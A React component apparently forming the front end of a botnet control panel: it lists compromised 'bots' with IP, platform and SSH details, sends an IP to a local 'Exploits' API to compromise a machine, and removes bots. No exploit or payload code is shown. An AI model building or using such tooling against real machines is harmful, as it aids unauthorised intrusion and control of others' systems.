import React, { useState, useEffect } from "react";
import axios from "axios";
import Bot from "./Bot";
import ExploitMachineForm from "./ExploitMachineForm";
import AddBotForm from "./AddBotForm";

const BotsUri = "https://localhost:44360/api/v1/Bots/";
const ExploitsUri = "https://localhost:44343/api/v1/Exploits/";

function BotList() {
  const [botList, setBotList] = useState([]);

  useEffect(() => {
    // TODO: Why set empty array first?
    setBotList([]);
    axios.get(BotsUri + "1").then((res) => {
      const newBotList = res.data;
      setBotList(newBotList);
    });
  }, []);

  const addBot = (bot) => {
    axios.post(ExploitsUri, bot).then((res) => {
      const newBot = res.data;
      const newBotList = [...botList, newBot];
      setBotList(newBotList);
    });
  };

  const exploitMachine = (ip) => {
    const machine = { ip: ip };

    axios.post(ExploitsUri, machine).then((res) => {
      const newBot = res.data;
      const newBotList = [...botList, newBot];
      setBotList(newBotList);
    });
  };

  const deleteBot = (bot) => {
    const id = bot.id;

    axios.delete(BotsUri + id).then(() => {
      const newBotList = botList.filter((filterBot) => filterBot.id !== bot.id);
      setBotList(newBotList);
    });
  };

  return (
    <div className="BotList container">
      <h2>Bots</h2>
      <table id="botlist-table">
        <thead>
          <tr>
            <th>ID</th>
            <th>IP address</th>
            <th>Platform</th>
            <th>Status</th>
            <th>SSH name</th>
            <th>SSH</th>
            <th>Remove</th>
          </tr>
        </thead>
        <tbody>
          {botList.map((bot) => (
            <Bot key={bot.id} bot={bot} deleteBot={deleteBot} />
          ))}
        </tbody>
      </table>
      <ExploitMachineForm exploitMachine={exploitMachine} />
      <AddBotForm addBot={addBot} />
    </div>
  );
}

export default BotList;
